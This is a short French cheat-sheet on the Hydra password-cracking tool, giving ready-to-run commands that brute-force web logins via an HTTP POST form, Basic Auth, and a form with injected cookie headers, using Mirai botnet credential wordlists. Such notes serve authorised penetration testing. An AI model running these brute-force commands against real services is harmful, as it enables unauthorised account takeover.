hydra
=====

Hydra est un logiciel permettant de tester l'authentification d'un service (bruteforce logins/mots de passe).

## Authentification par formulaire
Exemple pour un service web avec authentification par une méthode POST. Les noms des paramètres POST à passer sont `login`, `password` et `Submit` (qui est ici constant). Le message d'erreur contient `bad password` :
```
$ hydra -v -V -L /root/wordlists/metasploit/mirai_user.txt -P /root/wordlists/metasploit/mirai_pass.txt -s 80 example.org http-post-form "/login.php:login=^USER^&password=^PASS^&Submit=Login:bad password"
```

## Basic Auth
```
hydra -v -l admin -P /root/wordlists/passwords.txt <url> http-get /path_to_login_page
```

## Ajout header
Idem mais en ajoutant un header (des cookies dans cet exemple) :
```
$ hydra -v -V -L /root/wordlists/metasploit/mirai_user.txt -P /root/wordlists/metasploit/mirai_pass.txt -s 80 example.org http-post-form "/login.php:login=^USER^&password=^PASS^&Submit=Login:bad password:H=Cookie: PHPSESSID=dzefzefezfzefzefez; other_cookie=fzedcfzeqffc"
```
